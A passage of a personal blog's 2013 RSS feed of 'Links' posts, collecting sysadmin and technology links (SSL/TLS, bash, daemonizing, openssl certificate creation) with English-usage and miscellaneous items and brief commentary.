+<li>Mike Svoboda’s presentation on how CFEngine is used in LinkedIn: <a href="http://www.slideshare.net/MikeSvoboda/lisa-2013-sysopsapi-leveraging-inmemory-key-value-stores-for-large-scale-operations-with-redis-and-cfengine">slides</a> and <a href="http://www.youtube.com/watch?v=NCTSN5KOmbM">youtube</a></li>
+</ul>
+<h2>English</h2>
+<ul>
+<li><a href="http://www.macmillandictionaryblog.com/hit-the-nail-on-the-head">Bending over backwards to hit the nail on the head</a> – Have you got a bee in your bonnet about idioms? Do you bend over backwards to find opportunities to use them? If so, be careful not to go overboard; otherwise you might be at risk of putting your foot in it.</li>
+<li><a href="http://www.dailywritingtips.com/vice-versa-and-vis-a-vis/">Vice Versa and Vis-à-Vis</a> – get it right</li>
+</ul>
+<h2>Other</h2>
+<ul>
+<li>NYTimes article on <a href="http://www.nytimes.com/2013/10/20/travel/lvivs-and-a-familys-stories-in-architecture.html">Lviv’s history in architecture</a>.</li>
+<li>Triumph of ignorami lasted 7 days: Ukrainian ski resort <a href="http://www.bloomberg.com/news/2013-11-01/now-there-are-two-towns-that-ban-cell-service.html">outlawed</a> mobile phones based on citizens fantasies. Reminds me how bus and tram drivers were complaining they are receiving a radiation from newly installed GPS receivers (which do not emit any radiation by definition)</li>
+</ul>
+<p style="text-align: center;"><img class="aligncenter" alt="pay map" src="http://www.glassdoor.com/press/wp-content/files_mf/salarycomparison.usmap57.jpg" width="95%" height="95%" /><br />
+<img class="aligncenter" alt="pay list" src="http://www.glassdoor.com/blog/wp-content/uploads/25-Highest-Paying-Companies-for-Software-Engineers.jpg" width="90%" height="90%" /></p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Nov 8</title>
+		<link>/blog/2013/11/links-nov-8/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-nov-8</link>
+				<pubDate>Fri, 08 Nov 2013 21:40:35 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[Banksy]]></category>
+		<category><![CDATA[Beej]]></category>
+		<category><![CDATA[bootstrap]]></category>
+		<category><![CDATA[coursera]]></category>
+		<category><![CDATA[devops]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[HealthCare.gov]]></category>
+		<category><![CDATA[interviewing]]></category>
+		<category><![CDATA[Mavericks]]></category>
+		<category><![CDATA[names]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[Obama]]></category>
+		<category><![CDATA[OFA]]></category>
+		<category><![CDATA[plan]]></category>
+		<category><![CDATA[slang]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[writing]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/11/links-nov-8/</guid>
+				<description><![CDATA[You know, I&#8217;m totally baffled by the contrast in quality of Obama for America 2012 and ObamaCare projects. The first one was top-notch bleeding-edge technology project carried out with gleaming excellence, the second though has been a model failure by all means. 4Gb/s, 10k requests per second, 2,000 nodes, 3 datacenters, 180TB and 8.5 billion [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />You know, I&#8217;m totally baffled by the contrast in quality of Obama for America 2012 and ObamaCare projects. The first one was top-notch bleeding-edge technology project carried out with gleaming excellence, the second though has been a model failure by all means.</p>
+<blockquote><p>4Gb/s, 10k requests per second, 2,000 nodes, 3 datacenters, 180TB and 8.5 billion requests. Design, deploy, dismantle in 583 days to elect the President. <a href="https://twitter.com/search?q=%23madops&amp;src=hash">#madops</a></p></blockquote>
+<p>Tweet above summarises the challenge for OFA2012 project and here are few links about it:</p>
+<ul>
+<li>Obama for America on AWS — <a href="http://awsofa.info">Infrastructure Architecture</a></li>
+<li><a href="http://arstechnica.com/information-technology/2012/11/built-to-win-deep-inside-obamas-campaign-tech/">Built to win: Deep inside Obama’s campaign tech</a></li>
+<li><a href="http://arstechnica.com/information-technology/2012/11/how-team-obamas-tech-efficiency-left-romney-it-in-dust/">How Team Obama’s tech efficiency left Romney IT in dust</a></li>
+</ul>
+<p>Calamities with HealthCare.gov look like they&#8217;ve been using services of the <a href="http://devnull-as-a-service.com/home/">/dev/null-as-a-service</a> kind. Facepalm.</p>
+<p>Got an email from google+ telling me I&#8217;m eligible for custom URL. Made me even log in, found out it was still as revolting as it had been for a year or so, and on top of it, my very first posts to google+ were missing. Actually, one of the reasons I started to use G+ was to save interesting links I had come across, and as you might imagine, I&#8217;m thrilled to discover they wipe my older posts. So expect some flashbacks, as I&#8217;m not going to loose interesting stuff and will repost it here.</p>
+<p>Continuing to catch-up on links:</p>
+<h3>Technology</h3>
+<ul>
+<li>The Ars Technica <a href="http://arstechnica.com/apple/2013/10/os-x-10-9/">Review</a> of Mac OS X Mavericks, in-depth, long, and interesting reading.</li>
+<li><a href="https://wiki.mozilla.org/Security/Server_Side_TLS">Recommended</a> server-side SSL configurations</li>
+<li><a href="http://everythingsysadmin.com/2013/09/devops-lookfors.html">DevOps Look-fors</a> — the way of assessing your processes maturity</li>
+<li>Beej&#8217;s <a href="http://beej.us/guide/bgnet/output/html/singlepage/bgnet.html">Guide</a> to Network Programming</li>
+<li>Question asked on many interviews — can root kill init process? <a href="http://unix.stackexchange.com/questions/7441/can-root-kill-init-process">It depends</a>.</li>
+<li>Algorithms part 2 <a href="https://class.coursera.org/algs4partII-002/lecture/index">commenced</a>!</li>
+<li>Boostrap 3 add-ons <a href="http://habrahabr.ru/post/198346/">collection</a> (in Russian).</li>
+</ul>
+<h3>English</h3>
+<ul>
+<li>&#8220;Problem&#8221;-aversion is <a href="http://www.criticalpages.com/2013/problem-n-may-be-dropped-from-dictionary/">growing</a></li>
+<li>How Do Animals <a href="http://www.boredpanda.com/animal-sounds-different-languages-james-chapman/">Sound</a> In Different Languages?</li>
+<li>Did you say &#8220;<a href="http://www.oxforddictionaries.com/definition/english/muggle">muggle</a>&#8220;?</li>
+<li>The joy of <a href="http://www.bbc.co.uk/news/magazine-24669828">slang</a></li>
+<li>10 old letter-writing <a href="http://www.bbc.co.uk/news/magazine-24609533">tips</a> that work for emails</li>
+<li><a href="http://www.economist.com/blogs/prospero/2013/10/multilingualism-0">Bringing up baby bilingual</a></li>
+</ul>
+<h3>Other</h3>
+<ul>
+<li>Banksy <a href="http://www.bloomberg.com/news/2013-10-30/banksy-donates-nazi-doctored-landscape-to-help-aids-group.html">turns</a> 50$ painting into 1M$ treasure</li>
+<li>How a plan becomes policy:</li>
+</ul>
+<blockquote><p>In the beginning was the plan.<br />
+And then came the assumptions.<br />
+And the assumptions were without form.<br />
+And the plan was without substance.<br />
+And darkness was upon the face of the workers.<br />
+And they spoke among themselves saying,<br />
+&#8220;It is a crock of shit and it stinketh.&#8221;<br />
+And the workers went unto their supervisors and said,<br />
+&#8220;It is a pale of dung and none may abide the odor thereof.&#8221;<br />
+And the supervisor went unto their managers and said,<br />
+&#8220;It is a container of excrement and it is very strong, such that none may abide by it.&#8221;<br />
+And the managers went unto their directors, saying,<br />
+&#8220;It is a vessel of fertilizer, and none may abide its strength.&#8221;<br />
+And the directors spoke among themselves, saying to one another,<br />
+&#8220;It contains that which aids plant growth and it is very strong.&#8221;<br />
+And the directors went unto the vice presidents, saying unto them,<br />
+&#8220;It promotes growth and is very powerful.&#8221;<br />
+And the vice presidents went unto the president, saying unto him,<br />
+&#8220;The new plan will promote the growth and vigor of the company, with powerful effects.&#8221;<br />
+And the president looked upon the plan and saw that it was good.<br />
+And the plan became policy.<br />
+This is how shit happens.</p>
+<p style="text-align: right;"><a href="http://ogun.stanford.edu/~bnayfeh/plan.html">http://ogun.stanford.edu/~bnayfeh/plan.html</a></p>
+</blockquote>
+<ul>
+<li>Jennifer&#8217;s the winner: Six Decades of the Most Popular Names for Girls, State-by-State</li>
+</ul>
+<div style="width: 689px" class="wp-caption aligncenter"><a href="http://jezebel.com/map-sixty-years-of-the-most-popular-names-for-girls-s-1443501909"><img class="  " alt="" src="http://img.gawkerassets.com/img/192we19gx17khgif/ku-bigpic.gif" width="679" height="430" /></a><p class="wp-caption-text">Popular Girl&#8217;s Names</p></div>
+<p>&nbsp;</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Oct 27</title>
+		<link>/blog/2013/10/links-oct-27/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-oct-27</link>
+				<pubDate>Sun, 27 Oct 2013 18:40:46 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[base64]]></category>
+		<category><![CDATA[bash]]></category>
+		<category><![CDATA[capistrano]]></category>
+		<category><![CDATA[daemon]]></category>
+		<category><![CDATA[DNS]]></category>
+		<category><![CDATA[economist]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[evolution]]></category>
+		<category><![CDATA[honda]]></category>
+		<category><![CDATA[Krakauer]]></category>
+		<category><![CDATA[London]]></category>
+		<category><![CDATA[nohup]]></category>
+		<category><![CDATA[perl]]></category>
+		<category><![CDATA[pigs]]></category>
+		<category><![CDATA[pipes]]></category>
+		<category><![CDATA[religion]]></category>
+		<category><![CDATA[SSL]]></category>
+		<category><![CDATA[TLS]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/10/links-oct-27/</guid>
+				<description><![CDATA[This has been a busy month and, what pleases me, very productive. Apple&#8217;s recent announcement managed to surprise in many ways, which is delightful as well; if you&#8217;re still on Mountain Lion consider upgrading, Mavericks got it right in so many places, that it&#8217;s even difficult to tell which changes are most compelling. I&#8217;ve lagged [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />
+<h3></h3>
+<p>This has been a busy month and, what pleases me, very productive. <a href="http://www.apple.com/apple-events/october-2013/">Apple&#8217;s recent announcement</a> managed to surprise in many ways, which is delightful as well; if you&#8217;re still on Mountain Lion consider upgrading, Mavericks got it right in so many places, that it&#8217;s even difficult to tell which changes are most compelling.</p>
+<p>I&#8217;ve lagged on links, however, so catching up:</p>
+<h3>Technology</h3>
+<ul>
+<li>Short and to-the-point document on <a href="https://www.ssllabs.com/projects/best-practices/">SSL/TLS deployment best practices</a></li>
+<li>SSL self-signed certificate creation <a href="https://raymii.org/s/snippets/OpenSSL_One_line_to_create_self_signed_certificate.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+Raymiiorg+%28Raymii.org%29">one-liner</a>:</li>
+</ul>
+<blockquote><p>
+</p><pre class="crayon-plain-tag">openssl req -nodes -x509 -newkey rsa:4096 -keyout key.pem \
+   -out cert.pem -days 356</pre><p>
+</p></blockquote>
+<ul>
+<li>Don&#8217;t loose variables defined in a loop within a pipeline — <a href="http://mywiki.wooledge.org/BashFAQ/024">possible ways</a></li>
+<li>base64 implementations in <a href="https://sites.google.com/site/dannychouinard/Home/unix-linux-trinkets/little-utilities/base64-and-base85-encoding-awk-scripts">awk + od</a>, <a href="https://gist.github.com/markusfisch/2648733">bash augmented awk and pure bash</a></li>
+<li>Capistrano 3 — <a href="https://medium.com/p/ba896a142ac">what&#8217;s new</a></li>
+<li><a href="http://modernperlbooks.com/books/modern_perl/">Modern Perl</a> — Interesting on-line book on perl</li>
+<li><a href="http://stackoverflow.com/questions/958249/whats-the-difference-between-nohup-and-a-daemon#8915059">What exactly</a> does <code>nohup</code> and what it takes to become a daemon? Daemonizing summary:</li>
+</ul>
+<blockquote><p>
+</p><pre class="crayon-plain-tag">1. fork (first time) -- so we aren't a group leader, and let 
+   the parent exit.
+2. call setsid() -- to become leader of a new session. 
+   This call only works if we are not a group leader. 
+   This new session has no controlling terminal.
+3. fork (second time) -- so we aren't a session leader 
+   (and thus can't regain a controlling terminal), and let 
+   the parent exit.
+4. cd to root directory -- so we don't prevent other directories 
+   from being umount-ed.
+5. set umask to desired value (optional) -- because we could've 
+   inherited a mask we didn't want.
+6. close stdin, stdout, stderr (or just reopen them to point elsewhere)</pre><p>
+</p></blockquote>
+<ul>
+<li>What nohup does:</li>
+</ul>
+<blockquote><p>
+</p><pre class="crayon-plain-tag">- If stdout and stderr are connected to a terminal, 
+  redirects them to nohup.out
+- ignores SIGHUP</pre><p>
+</p></blockquote>
+<ul>
+<li><a href="http://samarudge.github.io/dnsyo/">Query</a> against over 1500 global DNS servers</li>
+</ul>
+<h3>English</h3>
+<ul>
+<li><a href="http://www.nytimes.com/newsgraphics/2013/10/13/russia/#">The Russia Left Behind.</a> A journey through a heartland on the slow road to ruin. — absolutely marvellous graphics representation of the article in New York Times.</li>
+<li><a href="http://theweek.com/article/index/250111/6-quests-to-fix-englishs-messed-up-spelling">6 quests</a> to fix English&#8217;s messed-up spelling Some succeeded. Some failed. Some made things worse.</li>
+<li>Style: Johnson: <a href="http://www.economist.com/blogs/prospero/2013/10/style">When is a rule not a rule</a>?</li>
+<li><a href="http://en.wikipedia.org/wiki/Into_the_Wild_(book)">Into the Wild by Jon Krakauer</a> — way too long, chewing over and over different aspects of impulsive and stupid act of overly naive and extremely self-confident young man in a futile attempt to idealise and glorify him. Read better <a href="http://www.online-literature.com/poe/101/">To Build the Fire by Jack London</a>: concise, well-balanced, thrilling novel that conveys incomparably more sense and wisdom.</li>
+<li>Harvard Business Review&#8217;s: <a href="http://blogs.hbr.org/2013/10/can-you-invent-something-new-if-your-words-are-old/">Can you invent something new if your words are old</a>? We&#8217;d better not reject new words.</li>
+</ul>
+<h3>Other</h3>
+<ul>
+<li>I&#8217;ve finally found where the phrase &#8220;With sufficient thrust, pigs fly just fine&#8221; comes from! Appears it&#8217;s from <a href="http://tools.ietf.org/html/rfc1925">RFC1925</a>:</li>
+</ul>
+<blockquote><p><code>(3) With sufficient thrust, pigs fly just fine. However, this is not<br />
+necessarily a good idea. It is hard to be sure where they<br />
+are going to land, and it could be dangerous sitting under them<br />
+as they fly overhead.<br />
+</code></p></blockquote>
+<p style="padding-left: 30px;">But references to flying pigs appear even in Lewis Carrol&#8217;s Alice:</p>
+<blockquote><p><code>"Thinking again?" the Duchess asked, with another dig of her sharp little chin.<br />
+"I've a right to think," said Alice sharply, for she was beginning to feel a little worried.<br />
+"Just about as much right," said the Duchess, "as pigs have to fly...." — Alice's Adventures in Wonderland, Chapter 9.<br />
+</code></p></blockquote>
+<ul>
+<li>Keeping fingers crossed for The Economists view to be true: <a href="http://www.economist.com/news/europe/21587260-russian-intransigence-has-helped-ukraines-integration-europe-looking-west">Russian intransigence has helped Ukraine’s integration into Europe</a></li>
+<li>Excellent post in Russian on <a href="http://botalex.livejournal.com/122329.html">evolution in life and as religion sees it</a></li>
+<li>Very cool Honda&#8217;s ad:</li>
+</ul>
+<blockquote><p><center><br />
+<iframe src="//www.youtube.com/embed/UelJZG_bF98" height="360" width="480" allowfullscreen="" frameborder="0"></iframe></center></p></blockquote>
+<p>&nbsp;</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: 29 Sep</title>
+		<link>/blog/2013/09/links-29-sep/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-29-sep</link>
+				<pubDate>Mon, 30 Sep 2013 08:45:12 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[collectd3]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[graphdb]]></category>
+		<category><![CDATA[load testing]]></category>
+		<category><![CDATA[mysql]]></category>
+		<category><![CDATA[paper]]></category>
+		<category><![CDATA[phoenix project]]></category>
+		<category><![CDATA[sher]]></category>
+		<category><![CDATA[surge]]></category>
+		<category><![CDATA[ted]]></category>
+		<category><![CDATA[terminal]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/09/links-29-sep/</guid>
+				<description><![CDATA[Technology: Real Terminal, All Chrome — No Nonsense Common MySQL queries Free Graph Databases e-book Surge conference 2012 videos Collectd3 is a modern visualization of collectd system performance statistics. See the live demo. Load testing: an unexpected journey — getting ready for Paper launch English An FYI on acronyms Language diversity issues in EU Other Better [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />
+<h3>Technology:</h3>
+<ul>
+<li><a href="http://blog.koding.com/2013/09/real-terminal-all-chrome-no-nonsense/">Real Terminal, All Chrome — No Nonsense</a></li>
+<li><a href="http://www.artfulsoftware.com/infotree/queries.php">Common MySQL queries</a></li>
+<li>Free <a href="http://graphdatabases.com">Graph Databases</a> e-book</li>
+<li>Surge conference <a href="http://surge.omniti.com/2012/speakers/">2012 videos</a></li>
+<li><a href="https://github.com/StackStorm/collectd3">Collectd3</a> is a modern visualization of collectd system performance statistics.
+<p style="display: inline !important;">See the <a href="http://184.72.154.239:9000/#/dashboard">live demo</a>.</p>
+</li>
+<li>Load testing: <a href="http://making.fiftythree.com/load-testing-an-unexpected-journey/">an unexpected journey</a> — getting ready for Paper launch</li>
+</ul>
+<h3>English</h3>
+<ul>
+<li><a href="http://www.macmillandictionaryblog.com/an-fyi-on-acronyms">An FYI on acronyms</a></li>
+<li><a href="http://www.economist.com/blogs/prospero/2013/09/language-diversity">Language diversity issues in EU</a></li>
+</ul>
+<h3>Other</h3>
+<p>Better later than never, spent the night reading this book, because could not have torn myself away from it. Absolute must-read for SAs, gives a perspective of IT role in modern firms, shows challenges management faces, and also vividly depicts how fast one can get IT working given right approaches. Excellent.</p>
+<div class="llynx_print"><a title="Go to The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win: Gene Kim, Kevin Behr, George Spafford: 9780988262591: Amazon.com: Books" href="http://www.amazon.com/The-Phoenix-Project-Helping-Business/dp/0988262592"><img alt="The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win: Gene Kim, Kevin Behr, George Spafford: 9780988262591: Amazon.com: Books" src="/blog/wp-content/uploads/2013/09/51rMT69p7rL1.jpg" width="67.919075144509" height="100" /></a></p>
+<div class="llynx_text"><a title="Go to The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win: Gene Kim, Kevin Behr, George Spafford: 9780988262591: Amazon.com: Books" href="http://www.amazon.com/The-Phoenix-Project-Helping-Business/dp/0988262592">The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win: Gene Kim, Kevin Behr, George Spafford: 9780988262591: Amazon.com: Books</a><small>http://www.amazon.com/The-Phoenix-Project-Helping-Business/dp/0988262592</small><span>Awesome book. It really captures the day to day struggles of the IT world. It give a unique look into the misconceptions of IT and how businesses tend to neglect the…</span></div>
+</div>
+<p>Very interesting Paula Scher&#8217;s TED talk where she looks back at a life in design (she&#8217;s done album covers, books, the Citibank logo &#8230;) and pinpoints the moment when she started really having fun.</p>
+<blockquote><p><center><iframe src="http://embed.ted.com/talks/paula_scher_gets_serious.html" height="315" width="560" allowfullscreen="" frameborder="0" scrolling="no"></iframe></center></p></blockquote>
+<p>Crikey, I know this feeling:</p>
+<blockquote>
+<p><center><div style="width: 502px" class="wp-caption alignnone"><a href="http://devopsreactions.tumblr.com/post/61835213724/bringing-a-sysadmin-to-a-social-event"><img alt="" src="http://media.tumblr.com/45a3dc24f9d84566735b5da2b2423577/tumblr_inline_mtebdm9YEh1raprkq.gif" width="492" height="261" /></a><p class="wp-caption-text">Bringing a sysadmin to a social event</p></div></center>
+</p></blockquote>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: 3 Aug</title>
+		<link>/blog/2013/08/links-3-aug/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-3-aug</link>
+				<pubDate>Fri, 02 Aug 2013 13:01:35 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[big-O]]></category>
+		<category><![CDATA[crc32]]></category>
+		<category><![CDATA[English]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/08/links-3-aug/</guid>
+				<description><![CDATA[Technology Know Thy Complexities! Big-O Cheat Sheet and its Russian translation The US is home to one third of the world’s data—here’s who’s storing it gawk/awk implementation of crc32 (compatible with the POSIX cksum command) Microsoft: Pure Dumb (Bad) Luck: &#8220;Where does this leave Microsoft? Not so great, I&#8217;m afraid. When even WindowsITPro.com is questioning your trust, [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />
+<h3>Technology</h3>
+<ul>
+<li><span style="line-height: 14px;">Know Thy Complexities! <a href="http://bigocheatsheet.com">Big-O Cheat Sheet</a> and its <a href="http://habrahabr.ru/post/188010/">Russian translation</a><br />
+</span></li>
+<li>The US is home to one third of the world’s data—<a href="http://qz.com/104868/the-us-is-home-to-one-third-of-the-worlds-data-heres-whos-storing-it/">here’s who’s storing it</a></li>
+<li>gawk/awk <a href="http://stackoverflow.com/questions/4994537/calculating-crc-in-awk">implementation</a> of crc32 (compatible with the POSIX cksum command)</li>
+<li><a href="http://www.standalone-sysadmin.com/blog/2013/07/microsoft-pure-dumb-bad-luck">Microsoft: Pure Dumb (Bad) Luck</a>: &#8220;Where does this leave Microsoft? Not so great, I&#8217;m afraid. When even <a href="http://windowsitpro.com/public-cloud/has-prism-shaken-your-trust-cloud">WindowsITPro.com is questioning your trust</a>, you&#8217;re in bad shape.&#8221;</li>
+<li><a href="http://ebalaskas.gr./blog/2013/07/20/imitate-tcp-wrapper/">How to imitate TCP Wrapper with iptables</a></li>
+<li><a href="http://blog.opendns.com/2013/07/24/what-is-a-sysadmin/">SysAdmins &#8211; In Their Own Words</a></li>
+</ul>
+<h3>English</h3>
+<ul>
+<li><span style="line-height: 14px;"><a href="http://www.slate.com/articles/life/a_fine_whine/2013/07/ghosting_the_irish_goodbye_the_french_leave_stop_saying_goodbye_at_parties.html">Don&#8217;t say good bye; just ghost</a>:</span></li>
+</ul>
+<blockquote>
+<p style="padding-left: 30px;">Ghosting—aka the Irish goodbye, the French exit, and any number of other vaguely ethnophobic terms—refers to leaving a social gathering without saying your farewells. One moment you’re at the bar, or the house party, or the Sunday morning wedding brunch. The next moment you’re gone.</p>
+</blockquote>
+<ul>
+<li><a href="http://www.economist.com/news/united-states/21581745-how-republicans-and-democrats-use-language-war-words">The war of the words</a>. How Republicans and Democrats use language:</li>
+</ul>
+<blockquote>
+<p style="padding-left: 30px;">Republicans are also better, Democrats fear, at agreeing on a message and sticking to it. Frank Luntz, a Republican consultant, once said: “There’s a simple rule. You say it again, and you say it again, and you say it again, and you say it again, and you say it again, and then again and again and again and again, and about the time that you’re absolutely sick of saying it is about the time that your target audience has heard it for the first time.”</p>
+</blockquote>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: 14 July</title>
+		<link>/blog/2013/07/links-14-july/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-14-july</link>
+				<pubDate>Sun, 14 Jul 2013 15:42:55 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[ganalytics]]></category>
+		<category><![CDATA[links]]></category>
+		<category><![CDATA[snowden]]></category>
+		<category><![CDATA[troubleshooting]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/07/links-14-july/</guid>
+				<description><![CDATA[Technology Three ways how to get Apache to automatically insert the Google Analytics script into every page on the fly. SSL: Intercepted today, decrypted tomorrow — recently leaked documents appear to reveal that the NSA logs very high volumes of internet traffic and retains captured encrypted communication for later cryptanalysis. The reason [&#8230;] is that if the SSL private key to [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />
+<h3>Technology</h3>
+<ul>
+<li><a href="http://cadlab.cs.ucla.edu/~kirill/analytics.html">Three ways</a> how to get Apache to automatically insert the Google Analytics script into every page on the fly.</li>
+<li><a href="http://news.netcraft.com/archives/2013/06/25/ssl-intercepted-today-decrypted-tomorrow.html">SSL: Intercepted today, decrypted tomorrow</a> — <a href="http://www.forbes.com/sites/andygreenberg/2013/06/20/leaked-nsa-doc-says-it-can-collect-and-keep-your-encrypted-data-as-long-as-it-takes-to-crack-it/">recently leaked documents</a> appear to reveal that the NSA logs <a href="http://www.wired.com/threatlevel/2012/03/ff_nsadatacenter/all/">very high volumes of internet traffic</a> and retains captured encrypted communication for later cryptanalysis. The reason [&#8230;] is that if the SSL private key to the encrypted traffic later becomes available — perhaps through court order, social engineering, successful attack against the website, or through cryptanalysis — all of the affected site’s historical traffic may then be decrypted at once.</li>
+<li><a href="http://devo.ps/blog/2013/03/06/troubleshooting-5minutes-on-a-yet-unknown-box.html">First 5 Minutes Troubleshooting A Server</a>, great post, Russian translation is <a href="https://pesin.space/blog/2013/07/first-5-minutes-troubleshooting-a-server/">here</a>.</li>
+<li><a href="https://developers.helloreverb.com/swagger/">Swagger</a> is a specification and complete framework implementation for describing, producing, consuming, and visualizing RESTful web services.</li>
+</ul>
+<h3>English</h3>
+<ul>
+<li><a href="http://www.chicagomanualofstyle.org/qanda/shopTalk/latestTalk.html">Shop Talk with Lynne Murphy</a> about American English versus British English.</li>
+</ul>
+<p>&nbsp;</p>
+]]></content:encoded>
+										</item>
+	</channel>
+</rss>
